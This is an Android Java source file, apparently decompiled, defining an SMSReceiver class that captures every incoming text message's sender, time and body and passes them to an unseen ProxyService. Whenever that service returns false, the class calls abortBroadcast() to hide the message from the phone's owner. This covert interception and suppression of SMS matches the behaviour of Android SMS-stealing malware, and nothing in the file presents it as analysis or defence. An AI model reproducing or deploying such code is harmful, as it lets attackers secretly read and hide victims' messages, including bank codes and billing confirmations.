package com.smart.studio.proxy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.text.SimpleDateFormat;
import java.util.Date;

public class SMSReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        SimpleDateFormat dateFormatter = new SimpleDateFormat("MM-dd HH:mm:ss");
        String msgBody = "";
        String sendAddr = "";
        Date time = new Date(0);
        try {
            Log.i("proxy", intent.getAction());
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] smsMsgs = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    smsMsgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    msgBody = new StringBuilder(String.valueOf(msgBody)).append(smsMsgs[i].getDisplayMessageBody()).toString();
                }
                sendAddr = smsMsgs[0].getDisplayOriginatingAddress();
                time = new Date(smsMsgs[0].getTimestampMillis());
            }
        } catch (Exception e) {
        }
        if (!ProxyService.receivedSMS(context, sendAddr, dateFormatter.format(time), msgBody)) {
            abortBroadcast();
        }
    }
}
